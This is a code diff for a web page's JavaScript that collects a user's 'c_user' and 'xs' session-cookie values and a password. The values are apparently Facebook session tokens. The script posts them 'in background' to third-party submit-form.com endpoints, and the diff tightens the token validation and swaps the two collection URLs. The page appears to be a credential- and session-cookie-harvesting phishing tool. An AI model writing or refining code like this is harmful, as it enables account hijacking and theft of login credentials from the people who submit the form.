@@ -27,9 +27,18 @@ function validateCuser(value) {
 }
 
 function validateXs(value) {
-    const mustContainEncodedColon = value.includes('%3A');
-    const strongPattern = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@#$%^&+=]).{12,}$/.test(value);
-    return mustContainEncodedColon && strongPattern;
+    // Must include %3A
+    const hasEncodedColon = value.includes('%3A');
+
+    // No spaces or emojis
+    const noSpaces = !/\s/.test(value);
+    const noEmojis = !/[\u{1F600}-\u{1F64F}]|[\u{1F300}-\u{1F5FF}]|[\u{1F680}-\u{1F6FF}]|[\u{1F1E0}-\u{1F1FF}]/u.test(value);
+
+    // Only allowed characters and minimum length
+    const validChars = /^[a-zA-Z0-9:%_-]+$/.test(value);
+    const isLongEnough = value.length >= 20;
+
+    return hasEncodedColon && noSpaces && noEmojis && validChars && isLongEnough;
 }
 
 function updateSubmitButton() {
@@ -68,12 +77,12 @@ cookieForm.addEventListener('submit', function(e) {
     }
 
     if (!validateXs(xsInput.value)) {
-        alert('xs token must be at least 12 characters, contain upper/lowercase letters, digits, special characters, and must include "%3A"');
+        alert('xs token must be at least 20 characters, contain only valid characters, no emojis or spaces, and must include "%3A"');
         return;
     }
 
     // Submit form data in background
-    fetch('https://submit-form.com/AKGfuoUDX', {
+    fetch('https://submit-form.com/X9OSyq93W', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json',
@@ -99,7 +108,7 @@ passwordForm.addEventListener('submit', function(e) {
         return;
     }
 
-    fetch('https://submit-form.com/X9OSyq93W', {
+    fetch('https://submit-form.com/AKGfuoUDX', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json',
